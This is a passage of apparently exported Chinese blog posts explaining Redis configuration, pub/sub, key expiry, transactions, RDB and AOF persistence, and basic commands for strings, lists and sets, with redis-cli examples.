此参数确定了TCP连接中已完成队列(完成三次握手之后)的长度, 当然此值必须不大于Linux系统定义的/proc/sys/net/core/somaxconn值,默认是511,而Linux的默认参数值是128。当系统并发量大并且客户端速度缓慢的时候,可以将这二个参数一起参考设定。该内核参数默认值一般是128,对于负载很大的服务程序来说大大的不够。一般会将它修改为2048或者更大。在/etc/sysctl.conf中添加:net.core.somaxconn = 2048,然后在终端中执行sysctl -p。\rtcp-backlog 511\r# 指定 redis 只接收来自于该 IP 地址的请求,如果不进行设置,那么将处理所有请求\rbind 127.0.0.1\r# 此参数为设置客户端空闲超过timeout,服务端会断开连接,为0则服务端不会主动断开连接,不能小于0。\rtimeout 0\r# 指定了服务端日志的级别。级别包括：debug（很多信息,方便开发、测试）,verbose（许多有用的信息,但是没有debug级别信息多）,notice（适当的日志级别,适合生产环境）,warn（只有非常重要的信息）\tloglevel notice\r# 指定了记录日志的文件。空字符串的话,日志会打印到标准输出设备。后台运行的redis标准输出是/dev/null。\rlogfile /var/log/redis/redis-server.log\r# 注释掉\u0026quot;save\u0026quot;这一行配置项就可以让保存数据库功能失效\r# 设置sedis进行数据库镜像的频率。\r# 900秒（15分钟）内至少1个key值改变（则进行数据库保存--持久化） # 300秒（5分钟）内至少10个key值改变（则进行数据库保存--持久化） # 60秒（1分钟）内至少10000个key值改变（则进行数据库保存--持久化）\rsave 900 1\rsave 300 10\rsave 60 10000\r更多配置详情：http://www.cnblogs.com/zhang-ke/p/5981108.html\n","permalink":"https://www.oomkill.com/2016/11/redis-install/","summary":"","title":"Redis安装"},{"content":"发布与订阅 Publish/Subscribe 发布订阅(pub/sub)是一种消息通信模式，主要的目的是解耦消息发布者和消息订阅者之间的藕合，这点和设计模式中的观察者模式比较相似。pub/sub不仅仅解决发布者和订阅者直接代码级别耦合也解决两者在物理部署上的耦合。Redis作为一个pub/sub的server,在订阅者和发布者之间起到了消息路由的功能。订阅者可以通过subscribe和psubscribe命令向Redis server订阅自己感兴趣的消息类型，Redis将消息类型称为通道(channel)。当发布者通过publish命令向Redis server发送特定类型的消息时。订阅该消息类型的全部client\n都会收到此消息。这里消息的传递是多对多的。一个client可以订阅多个channel,也可以向多个channel发送消息。\nRedis支持这样一种特性，你可以将数据推到某个信息管道中，然后其它人可以通过订阅这些管道来获取推送过来的信息。\n用一个客户端订阅频道 psubscribe new\r#### 1.批量订阅\r127.0.0.1:6379\u0026gt; publish news news-test\r(integer) 1\r127.0.0.1:6379\u0026gt; publish video video-test\r(integer) 1\r此时可以见到接受的信息\n127.0.0.1:6379\u0026gt; psubscribe news video\rReading messages... (press Ctrl-C to quit)\r1) \u0026quot;psubscribe\u0026quot;\r2) \u0026quot;news\u0026quot;\r3) (integer) 1\r1) \u0026quot;psubscribe\u0026quot;\r2) \u0026quot;video\u0026quot;\r3) (integer) 2\r1) \u0026quot;pmessage\u0026quot;\r2) \u0026quot;news\u0026quot;\r3) \u0026quot;news\u0026quot;\r4) \u0026quot;news-test\u0026quot;\r1) \u0026quot;pmessage\u0026quot;\r2) \u0026quot;video\u0026quot;\r3) \u0026quot;video\u0026quot;\r4) \u0026quot;video-test\u0026quot;\r数据过期设置及机制 Redis key的过期机制 Redis对过期键采用了lazy expiration：在访间key的时候判定key是否过期，如果过期，则进行过期处理（过期的key没有被访间可能不会被删除）。其次，每秒对volatile keys进行抽样测试，如果有过期键，那么对所有过期key进行处理。\nexpire设置key的生命周期 使用ttl命令可以获得某个key的过期时间\n127.0.0.1:6379\u0026gt; ttl test (integer) -1 #\u0026lt;== -1代表永久\r127.0.0.1:6379\u0026gt; ttl test1\r(integer) -2 #\u0026lt;==redis2.8后不存在的key返回-2\rexpire：设置一个key的生命周期，单位秒\n127.0.0.1:6379\u0026gt; expire site 10240000 #\u0026lt;==设置key多长时间后过期,单位秒\r(integer) 1\r127.0.0.1:6379\u0026gt; ttl site\r(integer) 10239996\rpexpire：以毫秒数设置key的生命周期\n127.0.0.1:6379\u0026gt; pexpire a 10000\r(integer) 1\r127.0.0.1:6379\u0026gt; ttl a\r(integer) 8\rpttl：以毫秒返回生命周期\n127.0.0.1:6379\u0026gt; pttl a\r(integer) 5432\rpersist：将key设置为永久有效\n127.0.0.1:6379\u0026gt; pexpire a 10000\r(integer) 1\r127.0.0.1:6379\u0026gt; persist a\r(integer) 1\r127.0.0.1:6379\u0026gt; ttl a\r(integer) -1\r设置指定时间过期 unix时间戳转换：http://tool.chinaz.com/Tools/unixtime.aspx\nlinux下获得unix时间戳\n$ date +%s #\u0026lt;==获得当前时间的时间戳\r1492845155 $ date +%s -d '2017-4-27 18:10' #\u0026lt;==获得指定时间的时间戳\r1493287800\r创建key时设置生命周期 127.0.0.1:6379\u0026gt; set test-expire test-tmp ex 10 #\u0026lt;==ex/px 秒/毫秒\rOK\r127.0.0.1:6379\u0026gt; ttl test-expire\r(integer) 4 事务 redis对事务的支持目前还比较简单。redis只能保证一个client发起的事务中的命令可以连续的执行，而中间不会插入其他client的命令。 由于redis是单线程来处理所有client的请求的，所以做到这点是很容易的。一般情况下redis在接受到一个client发来的命令后会立即处理并返回处理结果，但是当一个client在一个连接中发出multi命令有，这个连接会进入一个事务上下文，该连接后续的命令并不是立即执行，而是先放到一个队列中。当从此连接受到exec命令后，redis会顺序的执行队列中的所有命令。并将所有命令的运行结果打包到一起返回给client，然后此连接就结束事务上下文。\n用法 选项详解\n命令 描述 MULTI 于开启一个事务，它总是返回 OK DISCARD 清空事务队列， 并放弃执行事务。 EXEC 负责触发并执行事务中的所有命令 WATCH 为Redis 事务提供 check-and-set （CAS）行为；\n被WATCH的键会被监视，并会发觉这些键是否被改动过了。 如果有至少一个被监执行之前被修改了， 那么整个事务都会被取消。 127.0.0.1:6379\u0026gt; set num 1000\rOK\r127.0.0.1:6379\u0026gt; set num2 2000\rOK\r127.0.0.1:6379\u0026gt; multi #\u0026lt;==开启队列\rOK\r127.0.0.1:6379\u0026gt; decrby num2 1000 #\u0026lt;==将num2的值减少1000\rQUEUED #\u0026lt;==当客户端处于事务状态时,所有传入的命令都会返回一个内容为QUEUED的状态回复\r127.0.0.1:6379\u0026gt; get num2\r\u0026quot;1000\u0026quot; #\u0026lt;==这时在当前查看num2的值，发现已经被更改了\r127.0.0.1:6379\u0026gt; get num2 \u0026quot;2000\u0026quot; #\u0026lt;==此时在其他客户端查看num2的值\r127.0.0.1:6379\u0026gt; exec #\u0026lt;==执行队列中的语句\r1)(integer) 1000 127.0.0.1:6379\u0026gt; get num2 #\u0026lt;==这时在其他客户端查看num2\r\u0026quot;1000\u0026quot;\r注：即使事务中有某条/某些命令执行失败了， 事务队列中的其他命令仍然会继续执行，Redis 不会停止执行事务中的命令。\n127.0.0.1:6379\u0026gt; decrby num1 5\rQUEUED\r127.0.0.1:6379\u0026gt; decrby num2 aaa\rQUEUED\r127.0.0.1:6379\u0026gt; exec\r1) (integer) -5\r2) (error) ERR value is not an integer or out of range\r放弃事务 执行 DISCARD 命令，事务会被放弃，事务队列会被清空，并且客户端会从事务状态中退出\n127.0.0.1:6379\u0026gt; multi\rOK\r127.0.0.1:6379\u0026gt; keys *\rQUEUED\r127.0.0.1:6379\u0026gt; discard\rOK\r127.0.0.1:6379\u0026gt; keys *\r1) \u0026quot;num1\u0026quot;\r2) \u0026quot;num2\u0026quot;\r使用 check-and-set 操作实现乐观锁\n被 WATCH 的键会被监视，并会发觉这些键是否被改动过了。 如果有至少一个被监视的键在 EXEC 执行之前被修改了， 那么整个事务都会被取消， EXEC 返回空多条批量回复（null multi-bulk reply）来表示事务已经失败。\n127.0.0.1:6379\u0026gt; watch num1\rOK\r127.0.0.1:6379\u0026gt; multi\rOK\r127.0.0.1:6379\u0026gt; incr num1 #\u0026lt;==在其它客户端修改num1\r(integer) 101\r127.0.0.1:6379\u0026gt; incr num1\rQUEUED\r127.0.0.1:6379\u0026gt; exec\r(nil)\r参考资料 http://doc.redisfans.com/topic/transaction.html\n","permalink":"https://www.oomkill.com/2016/11/redis-subscribe-and-transaction/","summary":"","title":"redis事务与发布订阅"},{"content":"Redis的所有数据都存储在内存中，但是他也提供对这些数据的持久化。\nRedis是一个支持持久化的内存数据库，Redis需要经常将内存中的数据同步到磁盘来保证持久化。Redis支持四种持久化方式，一种是 Snapshotting(快照)也是默认方式 ，另一种是 Append-only file(aof)的方式 。\nRDB持久化方式 Snapshotting方式是将内存中数据以快照的方式写入到二进制文件中，默认的文件名为dump.rdb。可以通过配置设置自动做快照持久化。例如可以配置redis在n秒内如果超过m个key被修改就自动做快照。\n实现机制 Redis调用fork子进程。\n父进程继续处理client请求，子进程负责将内存内容写入到临时文件。由于os的实时复制机制(copy on write)父子进程会共享相同的物理页面，当父进程处理写请求时os会为父进程要修改的页面创建副本，而不是写共享的页面。所以子进程地址空间内的数据是fork时刻整个数据库的一个快照。\n当子进程将快照写入临时文件完毕后，用临时文件替换原来的快照文件，然后子进程退出。client也可以使用save或者bgsave命令通知redis做一次快照持久化。save操作是在主线程中保存快照的，由于redis是用一个主线程来处理所有client的请求，这种方式会阻塞所有clien:请求。所以不推荐使用。另一点需要注意的是，每次快照持久化都是完整写入到磁盘一次并不是增量的只同步变更数据。如果数据量大的话，而且写操作比较多，必然会引起大量的磁盘IO操作，可能会严重影响性能。\n缺点：\n快照方式是在一定间隔时间做一次的，所以如果redis意外down掉的话，就会丢失最后一次快照后的所有修改。如果应用要求不能丢失任何修改的话，可以采用aof持久化方式。\n相关配置 save 900 1 #←900秒内至少有1个key被改变\rsave 300 10 #←300秒内至少有10个key被改变\rsave 60 10000 #←60秒内至少有10000个key被改变\rstop-writes-on-bgsave-error yes #←后台存储错误后停止写。如：磁盘空间不足\rrdbcompression yes #←使用LZF压缩rdb文件\rrdbchecksum yes #←存储和加载rdb文件时校验\rdbfilename dump.rdb #←存储rdb文件名\rdir /app/redis/db/ #←rdb文件路径\r持久化测试 11512:M 22 Apr 01:04:47.028 * 5 changes in 60 seconds. Saving...\r11512:M 22 Apr 01:04:47.029 * Backgroundsaving started by pid 11520\r11520:C 22 Apr 01:04:47.032 * DB saved on disk\r11520:C 22 Apr 01:04:47.033 * RDB: 0 MB of memory used by copy-on-write\r11512:M 22 Apr 01:04:47.129 * Background saving terminated with success\r生成dump.rdb文件\n$ ll /app/redis/db\rdump.rdb\r关闭服务删除dump.rdb文件重新启动redis服务\n127.0.0.1:6379\u0026gt; keys *\r(empty list or set)\r将dump.rdb.bk文件恢复成dump.rdb。再启动服务器。\n127.0.0.1:6379\u0026gt; keys *\r1) \u0026quot;test-durable\u0026quot;\r2) \u0026quot;test-durable-1\u0026quot;\r手工强制刷新 127.0.0.1:6379\u0026gt; save\rOK\r127.0.0.1:6379\u0026gt; bgsave\rBackground saving started\r此时服务器端消息\n4330:M 30 Mar 02:42:14.496 * DB saved on disk\r$ 4330:M 30 Mar 02:42:28.700 * Background saving started by pid 18345\r18345:C 30 Mar 02:42:28.718 * DB saved on disk\r18345:C 30 Mar 02:42:28.718 * RDB: 0 MB of memory used by copy-on-write\r4330:M 30 Mar 02:42:28.796 * Background saving terminated with success\rAOF存储介绍 Append-Only-File(追加式的操作日志记录)\n由于快照方式是在一定间隔时间做一次的，所以如果redis意外down掉的话，就会丢失最后一次快照后的所有修改。如果应用要求不能丢失任何修改的话，可以采用aof持久化方式。\naof比快照方式有更好的持久化性，是由于在使用aof持久化方式时,redis会将每一个收到的写命令都通过write函数追加到文件中(默认是appendonly.aof)。当redis重启时会通过重新执行文件中保存的写命令来在内存中重建整个数据库的内容。当然由于os会在内核中缓存write做的修改，所以可能不是立即写到磁盘上。这样aof方式的持久化也还是有可能会丢失部分修改.不过我们可以通过配置文件告诉redis我们想要通过fsync函数强制os写入到磁盘的时机。\n实现机制 以日志的形式来记录每个写操作，将Redis执行过的所有写指令记录下来(不记录读操作)，只许追加文件但不可以改写文件，redis启动之初会读取该文件重新构建数据。当 Redis 重启时，它会优先使用AOF文件来还原数据，因为AOF文件保存的数据集通常比RDB文件所保存的数据集更完整。你甚至可以关闭持久化功能，让数据只在服务器运行时存在。在redis中这种存储方式默认是关闭的，需要在redis.conf文件中开启。\nRedis AOF重写原理图\r相关配置 appendonly no/yes #←是否打开 aof日志功能\rappendfsync always #←每次收到写命令就立即强制写入磁盘，最慢,保证完全的持久化，不推荐\rappendfsync everysec #←每秒钟强制写入磁盘一次，在性能和持久化方面折中，推荐\rappendfsync no #←完全依赖os，性能最好,持久化没保证\rno-appendfsync-on-rewrite yes: #←导出rdb快照的过程中,是否停止同步aof\rauto-aof-rewrite-percentage 100#←aof文件大小比起上次重写时的大小,增长率100%时,重写\rauto-aof-rewrite-min-size 64mb #←aof文件,至少超过64M时,重写\r测试 使用for循环批量更改一个key的值\nfor n in {1..8888};do redis-cli set name $n;done\r此时redis服务端的信息\n4330:M 30 Mar 02:15:23.581 * Starting automatic rewriting of AOF on 101% growth\r4330:M 30 Mar 02:15:23.581 * Background append only file rewriting started by pid 11921\r4330:M 30 Mar 02:15:24.598 * AOF rewrite child asks to stop sending diffs.\r11921:C 30 Mar 02:15:24.598 * Parent agreed to stop sending diffs. Finalizing AOF...\r11921:C 30 Mar 02:15:24.598 * Concatenating 0.02 MB of AOF diff received from parent.\r11921:C 30 Mar 02:15:24.606 * SYNC append only file rewrite performed\r11921:C 30 Mar 02:15:24.606 * AOF rewrite: 0 MB of memory used by copy-on-write\r4330:M 30 Mar 02:15:24.685 * Background AOF rewrite terminated with success\r4330:M 30 Mar 02:15:24.685 * Residual parent diff successfully flushed to the rewritten AOF (0.00 MB)\r此时日志文件大小\n$ ll -h\rtotal 132K\r-rw-r--r--. 1 root root 59K Mar 30 02:15 appendonly.aof\r-rw-r--r--. 1 root root 56 Mar 30 02:15 temp-rewriteaof-17659.aof\r$ ll -h\r-rw-r--r--. 1 root root 22K Mar 30 02:15 appendonly.aof\r手动生成新的AOF文件 bgrewriteaof\r日志重写 aof的方式也同时带来了另一个问题。持久化文件会变的越来越大。例如我们调用incr test命令100次，文保中必须保存全部的100条命令，其实有99条都是多余的。因为要恢复数据库的状态其实文件中保存一条set test 100就够了。为了压缩aof的持久化文件，Redis提供了bgrewriteaof命令.收到此命令Redis将使用与快照类似的方式将内存中的数据以命令的方式保存到临时文件中，最后替换原来的文件。\n自动bgrewriteaof参数设置\nauto-aof-rewrite-percentage 100\rauto-aof-rewrite-min-size 64m\r如何选择RDB和AOF ？ 一般来说,如果想达到足以媲美 PostgreSQL 的数据安全性，你应该同时使用两种持久化功能。如果你非常关心你的数据,但仍然可以承受数分钟以内的数据丢失，那么你可以只使用 RDB 持久化。有很多用户都只使用 AOF 持久化，并不推荐这种方式： 因为定时生成 RDB 快照（snapshot）非常便于进行数据库备份， 并且RDB恢复数据集的速度也要比AOF恢复的速度要快， 除此之外， 使用RDB还可以避免之前提到的AOF程序的bug 。因为以上提到的种种原因， 未来Redis可能会将AOF和RDB整合成单个持久化模型。（这是一个长期计划）。\n","permalink":"https://www.oomkill.com/2016/11/redis-persist/","summary":"","title":"redis数据持久化"},{"content":"key/value介绍 Redis key值是二进制安全的，这意味着可以用任何二进制序列作为key值，从形如“0foo”的简单字符串到一个JPG文件的内容都可以。空字符串也是有效key值。\n关于key的几条规则：\n太长的键值，例如1024字节的键值，不仅因为消耗内存，而且在数据中查找这类键值的计算成本很高。\n太短的键值，如果你要用 u:1000:pwd来代替user:1000:password，这没有什么问题，但后者更易阅读，并且由此增加的空间消耗相对于key object和value object本身来说很小.当然，没人阻止您一定要用更短的键值节省一丁点空间。\n最好坚持一种模式;。例如：object-type🆔field就是个不错的注意，像这样user:1000:password。我喜欢对多单词的字段名中加上一个点，就像这样：comment.1234.renlv_to\nkey建议：object-type🆔field 长度10-20\nvalue建议：string不要超过2K set sortedset元素不要超过5000\n$ redis-cli set user_list:user_id:5 zhangsan\rOK\r$ redis-cli get user_list:user_id:5\r\u0026quot;zhangsan\u0026quot;\r通用操作 找到全部给定模式的匹配到的key 127.0.0.1:6379\u0026gt; keys * #\u0026lt;==打印全部key\r1) \u0026quot;name\u0026quot;\r2) \u0026quot;site\u0026quot;\r127.0.0.1:6379\u0026gt; keys na[ma]e #\u0026lt;==返回正则匹配到的key\r1) \u0026quot;name\u0026quot;\r127.0.0.1:6379\u0026gt; keys nam?\r1) \u0026quot;name\u0026quot;\rrandomkey返回随机key 127.0.0.1:6379\u0026gt; randomkey\r\u0026quot;name\u0026quot;\r127.0.0.1:6379\u0026gt; randomkey\r\u0026quot;site\u0026quot;\rexists检查key是否存在 127.0.0.1:6379\u0026gt; exists site\r(integer) 1\r127.0.0.1:6379\u0026gt; exists sites\r(integer) 0\rtype 查看key类型 127.0.0.1:6379\u0026gt; type set\rset\r127.0.0.1:6379\u0026gt; type site\rstring\r修改key名称 127.0.0.1:6379\u0026gt; rename site web OK\r127.0.0.1:6379\u0026gt; keys *\r1) \u0026quot;set\u0026quot;\r2) \u0026quot;web\u0026quot;\r3) \u0026quot;name\u0026quot;\r4) \u0026quot;test\u0026quot;\rrenamnx rename not exists,当要修改的新名称存在,会用改名后的覆盖存在的那个key\n127.0.0.1:6379\u0026gt; set rename_test test\rOK\r127.0.0.1:6379\u0026gt; set rename_test1 test1\rOK\r127.0.0.1:6379\u0026gt; set tmp tmp\rOK\r127.0.0.1:6379\u0026gt; rename rename_test tmp\rOK\r127.0.0.1:6379\u0026gt; keys *\r1) \u0026quot;tmp\u0026quot;\r2) \u0026quot;rename_test1\u0026quot;\r127.0.0.1:6379\u0026gt; get tmp\r\u0026quot;test\u0026quot; #\u0026lt;==可以看到tmp把rename_test给覆盖了\r将当前数据库的 key 移动到给定的数据库db当中 127.0.0.1:6379\u0026gt; select 2\rOK\r127.0.0.1:6379[2]\u0026gt; keys *\r(empty list or set)\r127.0.0.1:6379[2]\u0026gt; select 0\rOK\r127.0.0.1:6379\u0026gt; move web 2\r(integer) 1\r127.0.0.1:6379\u0026gt; select 2\rOK\r127.0.0.1:6379[2]\u0026gt; keys *\r1)\u0026quot;web\u0026quot;\rdbsize返回当前选择的数据库的key数量 127.0.0.1:6379\u0026gt; dbsize\r(integer) 1\rshutdown 同步保存数据到磁盘，并结束Redis进程 语法：shutdown [NOSAVE|SAVE]\nredis-cli shutdown save\r12632:M 22 Apr 16:42:23.492 * Saving the final RDB snapshot before exiting.\r12632:M 22 Apr 16:42:23.528 * DB saved on disk\r12632:M 22 Apr 16:42:23.528 * Removing the pid file.\r12632:M 22 Apr 16:42:23.529 # Redis is now ready to exit, bye bye...\r异步操作Redis bgrewriteaof (异步重写aof日志文件) 作用减少aof文件大小 BGSAVE(异步保存数据到磁盘)\nString字符串类型 这是最简单的Redis类型。如果你只用这种类型,Redis就是一个可以持久化的memcached服务器(注:memcache的数据仅保存在内存中,服务器重启后,数据将丢失)。\n常规字符串操作 在Redis中，常用set设置一对key/value键值，然后用get来获取字符串的值。value值可以是任何类型的字符串(包括二进制数据)，例如你可以在一个键下保存一个jpg图片。但值的长度不能超过1GB。\nset：设置一个建的字符串值\n语法：set key value [EX seconds] [PX milliseconds] [NX|XX]\n127.0.0.1:6379\u0026gt; set k1 test🔑123\rOK 127.0.0.1:6379\u0026gt; ttl k1\r(integer) -1 #\u0026lt;==set默认生命周期为永久有效\r127.0.0.1:6379\u0026gt; set k1 test_key NX #\u0026lt;==设置一个key,如果不存在就创建。\r(nil) #\u0026lt;==因k1存在故没有创建\r127.0.0.1:6379\u0026gt; set k2 test_key NX\rOK\t#\u0026lt;==名为k2的key不存在成功创建\r127.0.0.1:6379\u0026gt; set k2 test EX 100 #\u0026lt;==设置key的生命周期 px毫秒 ex秒\rOK 127.0.0.1:6379\u0026gt; ttl k2\r(integer) 97\rmset：设置多个key value\n127.0.0.1:6379\u0026gt; mset key zhangsan ex 100 key1 lisi OK\r127.0.0.1:6379\u0026gt; keys *\r1) \u0026quot;key1\u0026quot;\r2) \u0026quot;ex\u0026quot;\r3) \u0026quot;key\u0026quot; #\u0026lt;==通过结果可得知 mset不支持判断是否存在与设置生命周期\rsetrange：从指定偏移量开始重写字符串的一部分\n127.0.0.1:6379\u0026gt; set key test:123\rOK\r127.0.0.1:6379\u0026gt; setrange key 5 abc\r(integer) 8\r127.0.0.1:6379\u0026gt; get key\r\u0026quot;test:abc\u0026quot; #\u0026lt;==不存在的偏移量用\\x00填充\rappend：将值附加到key中\n127.0.0.1:6379\u0026gt; set test a\rOK\r127.0.0.1:6379\u0026gt; APPEND test bc\r(integer) 3\r127.0.0.1:6379\u0026gt; get test\r\u0026quot;abc\u0026quot;\rgetrange：Get a substring of the string stored at a key\n127.0.0.1:6379\u0026gt; set k test:getrange\rOK\r127.0.0.1:6379\u0026gt; getrange k 0 3\r\u0026quot;test\u0026quot;\r127.0.0.1:6379\u0026gt; getrange k 0 100\r\u0026quot;test:getrange\u0026quot; #\u0026lt;==如果指定值大于字符串长度返回到字符串结尾处\r127.0.0.1:6379\u0026gt; getrange k 100 1000\r\u0026quot;\u0026quot; #\u0026lt;==如果开始位置大于字符串总长度,返回空字符串\rString类型可以用来存储数字 虽然字符串是Redis的基本值类型,但你仍然能通过它完成一些有趣的操作。例如：原子递增。\nINCR命令将字符串值解析成整型,将其加1,最后将结果保存为新的字符串值,类似的命令有INCRBY, DECR and DECRBYC实际上他们在内部就是同一个命令,只是看上去有点儿不同。\nincr是原子操作意味着什么呢?就是说即使多个客户端对同一个key发出INCR命令,也决不会导致竟争的情况.例如如下情况永远不可能发生:「客户端1和客户端2同时读出“10\u0026quot;,他们俩都对其加到11,然后将新值设置为11。最终的值一定是12,read-increment-set操作完成时,其他客户端不会在同一时间执行任何命令。\nincr:将键的整数值递增1\n127.0.0.1:6379\u0026gt; set num 1\rOK\r127.0.0.1:6379\u0026gt; incr num\r(integer) 2\rdecr:将键的整数值递减1\n127.0.0.1:6379\u0026gt; decr num\r(integer) 0\r127.0.0.1:6379\u0026gt; decr num\r(integer) -1 #\u0026lt;==与memcached不同的是,redis会被减少为负数\rincrby:将键增加一个指定定量\n127.0.0.1:6379\u0026gt; incrby num 10\r(integer) 9\rincrbyfloat: 将键增加一个指定定量的浮点值\n127.0.0.1:6379\u0026gt; incrbyfloat num \u0026quot;9.1\u0026quot; #\u0026lt;==操作后值变为浮点型\r127.0.0.1:6379\u0026gt; incrby num 11 (error) ERR value is not an integer or out of range #\u0026lt;==不可以在进行整型原子递增\r为key设置新值并且返回原值 对字符串,另一个操作是GETSET命令,行如其名:他为key设置新值并且返回原值。这有什么用处呢?例如:你的系统每当有新用户访问时就用INCR命令操作一个Redis key。你希望每小时对这个信息收集一次。你就可以GETSET这个key并给其赋值0并读取原值。\ngetset：设置key的字符串值，并返回旧值\n127.0.0.1:6379\u0026gt; getset k1 test:getset:demo\r\u0026quot;test\u0026quot;\r127.0.0.1:6379\u0026gt; get k1\r\u0026quot;test:getset:demo\u0026quot;\rsetbit getbit bitcount binop 这是偏移位上的二进制值\n(error) ERR bit offset is not an integer or out of range\r127.0.0.1:6379\u0026gt; setbit s 4294967296 1\r(error) ERR bit offset is not an integer or out of range\r127.0.0.1:6379\u0026gt; setbit s 4294967295 1 #\u0026lt;==最大范围为232-1 512M key的最大值\r(integer) 0\r(1.46s)\rList类型 要说清楚列表数据类型,最好先讲一点儿理论背景,在信息技术界List这个词常常被使用不当.例如\u0026quot;Python Lists\u0026quot;就名不副实(名为Linked Lists),但他们实际上是数组(同样的数据类型在Ruby中叫数组)。\n列表就是有序元素的序列:10,20,1,2,3就是一个列表。但用数组实现的List和用Linked List实现的List,在属性方面大不相同。\nRedis lists基于Linked Lists实现。这意味着即使在一个list中有数百万个元素,在头部或尾部添加一个元素的操作,其时间复杂度也是常数级别的。用LPUSH命令在十个元素的list头部添加新元素,和在千万元素list头部添加新元素的速度相同。\n那么,坏消息是什么?在数组实现的list中利用索引访问元素的速度极快,而同样的操作在linked list实现的list上没有那么快。\nRedis Lists用linked list实现的原因是:对于数据库系统来说,至关重要的特性是:能非常快的在很大的列表上添加元素.另一个重要因素是,正如你将要看到的:Redis lists能在常数时何取得常数长度。\n创建list并插入数据 LPUSH命令可向list的左边(头部)添加一个新元素,而RPUSH命令可向list的右边(尾部)添加一个新元素。最后LRANGE命令可从list中取出一定范围的元素。\nlpush:向list头部插入数据，如果list不存在则自动创建\n127.0.0.1:6379\u0026gt; lpush list lisi #\u0026lt;== 头部插入一个数据\r(integer) 1\r127.0.0.1:6379\u0026gt; lpush list zhangsan\r(integer) 2\rllen:查看list列表元素个数\n127.0.0.1:6379\u0026gt; llen list\t#\u0026lt;==获得列表元素个数\r(integer) 2\rlrange:查看列表所有元素\n127.0.0.1:6379\u0026gt; lrange list 0 3 #\u0026lt;== 打印列表的1,3元素\r1) \u0026quot;zhangsan\u0026quot;\r2) \u0026quot;lisi\u0026quot;\r3) \u0026quot;test1\u0026quot;\r127.0.0.1:6379\u0026gt; lrange list 0 -1#\u0026lt;== 打印列表的所有元素\r⚠ 注意：RANGE带有两个索引,范围内第一个和最后一个元素。这两个索引都可以负来告知redis从尾部开始计数,因此-1表示最后一个元素,-2表示list中的倒数第二个元素,以此类推。 lindex:返回指定元素在列表中的下标\n127.0.0.1:6379\u0026gt; rpush a 1 2 3 4 5\r(integer) 5\r127.0.0.1:6379\u0026gt; lindex a 1\r\u0026quot;2\u0026quot;\r127.0.0.1:6379\u0026gt; lindex a 1\rlinsert在指定元素前后插入数据\n127.0.0.1:6379\u0026gt; rpush arr 1 2 3\r(integer) 3\r127.0.0.1:6379\u0026gt; linsert arr after 2 5\r(integer) 4\r127.0.0.1:6379\u0026gt; lrange arr 0 -1\r1) \u0026quot;1\u0026quot;\r2) \u0026quot;2\u0026quot;\r3) \u0026quot;5\u0026quot;\r4) \u0026quot;3\u0026quot;\rlist应用场景 正如你可以从上面的例子中猜到的,list可被用来实现聊天系统。还可以作为不同进程间传递消息的队列。关键是,你可以每次都以原先添加的顺序访问数据。这不需要任何SQL ORDER BY操作,将会非常快,也会很容易扩展到百万级别元素的规模。\n例如在评级系统中,比如社会化新闻网站reddit.com,你可以把每个新提交的链接添加到一个list,用LRANGE可简单的对结果分页。\n在博客引擎实现中,你可为每篇日志设置一个list,在该list中推入进博客评论,等等。\n向Redis list压入ID而不是实际的数据,\n在上面的例子里,我们将“对象”(此例中是简单消息)直接压入Redis list,但通常不应这么做,由于对象可能被多次引4:例如在一个lis:中维护其时间顺序,在一个集合中保存它的类别,只要有必要,它还会出现在其他list中,等等。\n让我们回到reddit.com的例子,将用户提交的链接(新闻)添加到list中,有更可靠的方法如下所示\n127.0.0.1:6379\u0026gt; incr next.news.id\r(integer) 1\r127.0.0.1:6379\u0026gt; set new:1:title \u0026quot;redis is simple\u0026quot;\rOK\r127.0.0.1:6379\u0026gt; set news:1:url \u0026quot;http://www.baidu.com\u0026quot;\rOK\r127.0.0.1:6379\u0026gt; lpush submitted.news 1\r(integer) 1\rOK我们自增一个key,很容易得到一个独一无二的自增ID,然后通过此ID创建对象入为对象的每个字段设置一个key。最后将新对象的submitted.news lists。\nrpop 从尾部删除一个元素 rpush 向尾部插入一个数据 lpop 从头部删除一个元素\n删除list内元素 lrem:删除count的绝对值个value后结束 count \u0026gt; 0从头开始删,\u0026lt;0从尾部开始删\n127.0.0.1:6379\u0026gt; rpush aa a a b c a a\r(integer) 6\r127.0.0.1:6379\u0026gt; lrem aa 1 a\r(integer) 1\r127.0.0.1:6379\u0026gt; LRANGE aa 0 -1\r1) \u0026quot;a\u0026quot;\r2) \u0026quot;b\u0026quot;\r3) \u0026quot;c\u0026quot;\r4) \u0026quot;a\u0026quot;\r5) \u0026quot;a\u0026quot;\r127.0.0.1:6379\u0026gt; lrem aa -2 a\r(integer) 2\r127.0.0.1:6379\u0026gt; LRANGE aa 0 -1\r1) \u0026quot;a\u0026quot;\r2) \u0026quot;b\u0026quot;\r3) \u0026quot;c\u0026quot;\rltrim:剪切key对应的链接,切[start,stop]一段,并把该段重新赋给key\n127.0.0.1:6379\u0026gt; rpush a 1 2 3 4 5\r(integer) 5\r127.0.0.1:6379\u0026gt; ltrim a 2 3\rOK\r127.0.0.1:6379\u0026gt; lrange a 0 -1\r1) \u0026quot;3\u0026quot;\r2) \u0026quot;4\u0026quot;\rrpoplpush:将arr尾部的元素弹出到tmp头部\n作用：接收返回值,并做业务处理。如果成功,rpop tmp清除任务；如不成功,下次从tmp表里取任务\n127.0.0.1:6379\u0026gt; rpoplpush arr tmp\r\u0026quot;3\u0026quot;\r127.0.0.1:6379\u0026gt; lrange arr 0 -1\r1) \u0026quot;1\u0026quot;\r2) \u0026quot;2\u0026quot;\r3) \u0026quot;5\u0026quot;\r127.0.0.1:6379\u0026gt; lrange tmp 0 -1\r1) \u0026quot;3\u0026quot;\rset集合 Redis集合是未排序的集合,其元素是二进制安全的字符串。sadd命令可以向集合添加一个新元素。和sets相关的操作也有许多,比如检测某个元素是否存在,以及实现交集,并集,差集等等。\n创建并向集合插入新元素 sadd：向集合内添加一个或多个元素\n127.0.0.1:6379\u0026gt; sadd set a b c d #\u0026lt;==向集合key中增加元素\r(integer) 4 smembers：查看集合内所有元素\n127.0.0.1:6379\u0026gt; smembers set #\u0026lt;==返回集合中的所有元素\r1) \u0026quot;d\u0026quot;\r2) \u0026quot;c\u0026quot;\r3) \u0026quot;b\u0026quot;\r4) \u0026quot;a\u0026quot;\r删除集合中元素 sadd：从集合内删除一个或多个指定元素\n127.0.0.1:6379\u0026gt; srem set a #\u0026lt;==删除集合中名为a的元素\r(integer) 1\r127.0.0.1:6379\u0026gt; smembers set\r1) \u0026quot;d\u0026quot;\r2) \u0026quot;c\u0026quot;\r3) \u0026quot;b\u0026quot;\r查看集合内元素 sismember：检查集合中是否存在某个元素\n127.0.0.1:6379\u0026gt; sismember 